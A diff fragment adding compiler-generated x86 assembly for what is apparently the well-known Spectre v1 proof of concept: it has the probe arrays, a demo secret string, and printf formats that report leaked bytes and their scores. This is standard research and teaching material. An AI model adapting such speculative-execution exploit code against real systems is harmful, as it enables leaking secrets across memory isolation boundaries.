+	.cfi_adjust_cfa_offset 4
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	edx
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	test	esi, esi
+	jle	.LBB3_40
+# %bb.39:                               #   in Loop: Header=BB3_8 Depth=2
+	mov	ecx, dword ptr [esp + 12]       # 4-byte Reload
+	movzx	eax, cl
+	add	cl, -32
+	cmp	cl, 95
+	mov	ecx, 63
+	cmovb	ecx, eax
+	lea	edx, [ebx + .L.str.11@GOTOFF]
+	push	esi
+	.cfi_adjust_cfa_offset 4
+	push	ecx
+	.cfi_adjust_cfa_offset 4
+	push	eax
+	.cfi_adjust_cfa_offset 4
+	push	edx
+	.cfi_adjust_cfa_offset 4
+	call	printf@PLT
+	add	esp, 16
+	.cfi_adjust_cfa_offset -16
+	jmp	.LBB3_40
+	.p2align	4, 0x90
+.LBB3_41:                               #   in Loop: Header=BB3_1 Depth=1
+	mov	esi, dword ptr [esp + 56]       # 4-byte Reload
+	jmp	.LBB3_1
+.LBB3_43:
+	xor	eax, eax
+	add	esp, 76
+	.cfi_def_cfa_offset 20
+	pop	esi
+	.cfi_def_cfa_offset 16
+	pop	edi
+	.cfi_def_cfa_offset 12
+	pop	ebx
+	.cfi_def_cfa_offset 8
+	pop	ebp
+	.cfi_def_cfa_offset 4
+	ret
+.Lfunc_end3:
+	.size	main, .Lfunc_end3-main
+	.cfi_endproc
+                                        # -- End function
+	.type	x_is_safe_static,@object        # @x_is_safe_static
+	.bss
+	.globl	x_is_safe_static
+	.p2align	2
+x_is_safe_static:
+	.long	0                               # 0x0
+	.size	x_is_safe_static, 4
+
+	.type	array1,@object                  # @array1
+	.data
+	.globl	array1
+array1:
+	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
+	.zero	144
+	.size	array1, 160
+
+	.type	.L.str,@object                  # @.str
+	.section	.rodata.str1.1,"aMS",@progbits,1
+.L.str:
+	.asciz	"The Magic Words are Squeamish Ossifrage."
+	.size	.L.str, 41
+
+	.type	secret,@object                  # @secret
+	.data
+	.globl	secret
+	.p2align	2
+secret:
+	.long	.L.str
+	.size	secret, 4
+
+	.type	temp,@object                    # @temp
+	.bss
+	.globl	temp
+temp:
+	.byte	0                               # 0x0
+	.size	temp, 1
+
+	.type	array2,@object                  # @array2
+	.globl	array2
+array2:
+	.zero	131072
+	.size	array2, 131072
+
+	.type	readMemoryByte.results,@object  # @readMemoryByte.results
+	.local	readMemoryByte.results
+	.comm	readMemoryByte.results,1024,4
+	.type	.L.str.1,@object                # @.str.1
+	.section	.rodata.str1.1,"aMS",@progbits,1
+.L.str.1:
+	.asciz	"Putting '%s' in memory, address %p\n"
+	.size	.L.str.1, 36
+
+	.type	.L.str.2,@object                # @.str.2
+.L.str.2:
+	.asciz	"%p"
+	.size	.L.str.2, 3
+
+	.type	.L.str.3,@object                # @.str.3
+.L.str.3:
+	.asciz	"%d"
+	.size	.L.str.3, 3
+
+	.type	.L.str.4,@object                # @.str.4
+.L.str.4:
+	.asciz	"Trying malicious_x = %p, len = %d\n"
+	.size	.L.str.4, 35
+
+	.type	.L.str.5,@object                # @.str.5
+.L.str.5:
+	.asciz	"Reading %d bytes:\n"
+	.size	.L.str.5, 19
+
+	.type	.L.str.6,@object                # @.str.6
+.L.str.6:
+	.asciz	"Reading at malicious_x = %p secc= %c ..."
+	.size	.L.str.6, 41
+
+	.type	.L.str.7,@object                # @.str.7
+.L.str.7:
+	.asciz	"%s: "
+	.size	.L.str.7, 5
+
+	.type	.L.str.8,@object                # @.str.8
+.L.str.8:
+	.asciz	"Success"
+	.size	.L.str.8, 8
+
+	.type	.L.str.9,@object                # @.str.9
+.L.str.9:
+	.asciz	"Unclear"
+	.size	.L.str.9, 8
+
+	.type	.L.str.10,@object               # @.str.10
+.L.str.10:
+	.asciz	"0x%02X='%c' score=%d "
+	.size	.L.str.10, 22
+
+	.type	.L.str.11,@object               # @.str.11
+.L.str.11:
+	.asciz	"(second best: 0x%02X='%c' score=%d)"
+	.size	.L.str.11, 36
+
+	.type	.L.str.13,@object               # @.str.13
+.L.str.13:
+	.asciz	"addr = %llx, pid = %d\n"
+	.size	.L.str.13, 23
+
+	.type	unused1,@object                 # @unused1
+	.bss
+	.globl	unused1
+unused1:
+	.zero	64
+	.size	unused1, 64
+
+	.type	unused2,@object                 # @unused2
+	.globl	unused2
+unused2:
+	.zero	64
+	.size	unused2, 64
+
+	.type	unused3,@object                 # @unused3
+	.globl	unused3
+unused3:
+	.zero	64
+	.size	unused3, 64
+
+	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
+	.section	".note.GNU-stack","",@progbits
+	.addrsig
+	.addrsig_sym check
+	.addrsig_sym x_is_safe_static
+	.addrsig_sym array1
+	.addrsig_sym array2
